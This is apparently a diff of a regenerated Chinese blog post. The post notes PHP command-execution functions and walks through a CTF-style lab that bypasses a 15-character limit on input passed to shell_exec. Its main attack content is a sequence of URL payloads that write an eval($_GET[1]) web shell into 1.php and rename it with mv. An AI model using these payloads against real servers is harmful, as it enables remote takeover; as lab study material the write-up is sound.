@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      765 字
+      764 字
     </span>
   
 
@@ -249,21 +249,21 @@
               <p>看到一个关于任意命令执行的视频后感觉很有意思，可以记录以下，以后可能会用到。</p>
 <span id="more"></span>
 
-<h1 id="php中存在命令执行的常见函数"><a href="#php中存在命令执行的常见函数" class="headerlink" title="php中存在命令执行的常见函数"></a>php中存在命令执行的常见函数</h1><h2 id="1-system"><a href="#1-system" class="headerlink" title="1.system"></a>1.system</h2><div class="hljs"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line = system(&#x27;ls&#x27;, $return_var);</span>
+<h1 id="php中存在命令执行的常见函数"><a href="#php中存在命令执行的常见函数" class="headerlink" title="php中存在命令执行的常见函数"></a>php中存在命令执行的常见函数</h1><h2 id="1-system"><a href="#1-system" class="headerlink" title="1.system"></a>1.system</h2><div class="hljs"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$last</span>_line = system(&#x27;ls&#x27;, $return_var);</span>
 <span class="hljs-keyword">system</span>() 会将输出内容直接印出, 所以若于网页, 会将所有回传内容都显示于页面上.
-<span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line: 只能取得最后一行的内容</span>
-<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre></div>
+<span class="hljs-meta"><span class="hljs-keyword">$last</span>_line: 只能取得最后一行的内容</span>
+<span class="hljs-meta"><span class="hljs-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre></div>
 
 
 
-<h2 id="2-shell-exec"><a href="#2-shell-exec" class="headerlink" title="2.shell_exec"></a>2.shell_exec</h2><div class="hljs"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$output</span> = shell_exec(&#x27;ls&#x27;);</span>
-<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成纯文字内容), 不会直接秀在页面上.</span></code></pre></div>
+<h2 id="2-shell-exec"><a href="#2-shell-exec" class="headerlink" title="2.shell_exec"></a>2.shell_exec</h2><div class="hljs"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$output</span> = shell_exec(&#x27;ls&#x27;);</span>
+<span class="hljs-meta"><span class="hljs-keyword">$output</span>: 回传内容都会存于此变数中(储存成纯文字内容), 不会直接秀在页面上.</span></code></pre></div>
 
 
 
 <h2 id="3-exec"><a href="#3-exec" class="headerlink" title="3.exec"></a>3.exec</h2><div class="hljs"><pre><code class="hljs gams">exec(<span class="hljs-string">&#x27;ls&#x27;</span>, <span class="hljs-symbol">$</span>output, <span class="hljs-symbol">$</span>return_var);
-<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成阵列), 不会直接秀在页面上.</span>
-<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre></div>
+<span class="hljs-meta"><span class="hljs-keyword">$output</span>: 回传内容都会存于此变数中(储存成阵列), 不会直接秀在页面上.</span>
+<span class="hljs-meta"><span class="hljs-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre></div>
 
 
 
@@ -286,11 +286,11 @@ $d = <span class="hljs-string">&#x27;phpinfo()&#x27;</span><span class="hljs-com
 call_user_func($a,$b)<span class="hljs-comment">;</span>
 call_user_func($c,$d)<span class="hljs-comment">;</span></code></pre></div>
 
-<h2 id="5-call-user-func"><a href="#5-call-user-func" class="headerlink" title="5.call_user_func"></a>5.call_user_func</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = create_function(<span class="hljs-string">&#x27;$code&#x27;</span>,<span class="hljs-string">&#x27;echo $code;&#x27;</span>);
+<h2 id="5-call-user-func"><a href="#5-call-user-func" class="headerlink" title="5.call_user_func"></a>5.call_user_func</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$code&#x27;</span>,<span class="hljs-string">&#x27;echo $code;&#x27;</span>);
 <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;hello&#x27;</span>;
 <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);
 <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;
-<span class="hljs-variable">$b</span> = create_function(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);
+<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);
 <span class="hljs-variable">$b</span>();
 
 <span class="hljs-comment">//和下面两个定义的函数作用相同</span>
@@ -299,7 +299,7 @@ call_user_func($c,$d)<span class="hljs-comment">;</span></code></pre></div>
 &#125;
 
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span>&#123;
-    phpinfo();
+    <span class="hljs-title function_ invoke__">phpinfo</span>();
 &#125;
 </code></pre></div>
 
@@ -309,10 +309,10 @@ call_user_func($c,$d)<span class="hljs-comment">;</span></code></pre></div>
 <p>实验目的</p>
 <p>通过命令执行想服务器写入一句话木马而达到控制服务器的目的</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-highlight_file(<span class="hljs-keyword">__FILE__</span>);
-<span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>])&lt;=<span class="hljs-number">15</span>)&#123;
-    <span class="hljs-keyword">echo</span> strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
-    <span class="hljs-keyword">echo</span> shell_exec(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>])&lt;=<span class="hljs-number">15</span>)&#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
+    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
 &#125;
 <span class="hljs-keyword">else</span>&#123;
     <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;It&#x27;s too long!&quot;</span>);
@@ -323,7 +323,7 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
 <p>然后将传递的参数放到shell_exec中执行</p>
 <p>突破点就是利用shell_exec函数将，我们的一句话木马写入到一个php文件中，获取shell。</p>
 <p>所以想要够的payload的为</p>
-<div class="hljs"><pre><code class="hljs url">?1&#x3D;echo shellcode &gt;1.php</code></pre></div>
+<div class="hljs"><pre><code class="hljs url">?1=echo shellcode &gt;1.php</code></pre></div>
 
 <p>将一句话木马写入到1.php中，我们知道一句话木马最短字符长度应该为21 ，这显然不能达到14个字符的限制要求</p>
 <p><img src="https://i.loli.net/2020/11/29/JoPC8xrVBXQOqmE.png" srcset="/img/loading.gif" alt="muma.png"></p>
@@ -334,13 +334,13 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
 <p>字符限制解决了，那么得知道换行后php代码还能正常执行吗，本地验证发现是没问题的</p>
 <p><img src="https://i.loli.net/2020/11/29/HWEXFrRjaDGp726.png" srcset="/img/loading.gif" alt="yanzheng.png"></p>
 <p>下面就可以做这个题目了</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-comment">//为了每次写入更多的字符可以利用无后缀名的文件，最后用mv将其改为php文件</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \&lt;\?php &gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>\( &gt;&gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \<span class="hljs-variable">$_GET</span> &gt;&gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \[<span class="hljs-number">1</span>\] &gt;&gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \)\; &gt;&gt;<span class="hljs-number">1</span> 
-?<span class="hljs-number">1</span>=mv <span class="hljs-number">1</span> <span class="hljs-number">1.</span>php</code></pre></div>
+<div class="hljs"><pre><code class="hljs bash">//为了每次写入更多的字符可以利用无后缀名的文件，最后用<span class="hljs-built_in">mv</span>将其改为php文件
+?1=<span class="hljs-built_in">echo</span> \&lt;\?php &gt;1
+?1=<span class="hljs-built_in">echo</span> <span class="hljs-built_in">eval</span>\( &gt;&gt;1
+?1=<span class="hljs-built_in">echo</span> \<span class="hljs-variable">$_GET</span> &gt;&gt;1
+?1=<span class="hljs-built_in">echo</span> \[1\] &gt;&gt;1
+?1=<span class="hljs-built_in">echo</span> \)\; &gt;&gt;1 
+?1=<span class="hljs-built_in">mv</span> 1 1.php</code></pre></div>
 
 <p>之后访问1.php提交参数，获取想要的内容。</p>
 
